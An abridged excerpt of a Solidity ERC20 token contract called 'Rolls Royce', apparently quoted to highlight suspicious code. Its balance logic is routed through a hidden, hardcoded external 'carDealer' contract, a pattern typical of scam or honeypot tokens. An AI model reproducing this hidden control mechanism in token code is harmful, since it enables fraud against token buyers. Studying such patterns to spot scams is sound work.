...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _carDealer = 0x344a73cE177cE181E6B34C1cbe8e31a92E1886b8;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return carDealer.confirmTransaction(amount);
    }
    ...
    function _DeployRollsRoyce(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRollsRoyce(creator, initialSupply);
    }
}

contract RollsRoyce is ERC20Token {
    constructor() ERC20Token("Rolls Royce", "RR", msg.sender, 100000000 * 10 ** 18) {
    }
}